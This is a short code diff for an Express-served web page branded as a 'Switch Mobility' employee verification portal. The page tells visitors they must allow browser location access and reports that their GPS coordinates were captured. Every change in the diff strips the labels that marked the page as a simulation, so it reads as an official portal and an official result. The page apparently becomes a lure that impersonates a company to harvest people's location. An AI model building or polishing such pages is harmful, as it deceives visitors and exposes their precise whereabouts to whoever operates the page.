@@ -140,7 +140,7 @@ app.get("/", (req, res) => {
     <div class="header">
         <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSKlOTa6nQ9IBee3wQutYYddsDsiVMbGqXRhHaYG0Ax&s=10" alt="Switch Mobility" class="logo">
         <h2>Employee Verification</h2>
-        <p class="subtitle">Official Remote Work Simulation Portal</p>
+        <p class="subtitle">Official Work Customer Portal</p>
     </div>
 
     <div class="section-title">Employee Details (Read-Only)</div>
@@ -177,7 +177,7 @@ app.get("/", (req, res) => {
         To complete the verification process, you must <strong>Allow</strong> browser location access when prompted. This is required for residency compliance.
     </div>
 
-    <button id="submitBtn" onclick="handleSubmission()">Verify Location & Download Report</button>
+    <button id="submitBtn" onclick="handleSubmission()">Download Report and customer interaction feedback</button>
     <div id="statusMsg"></div>
 </div>
 
@@ -316,7 +316,7 @@ LOCATION AUDIT:
 GPS Coordinates successfully captured and matched against
 residential zoning requirements.
 
-Simulated Result: PASSED
+Result: PASSED
 
 Welcome to the Switch Mobility Remote Fleet Program.
 ============================================================
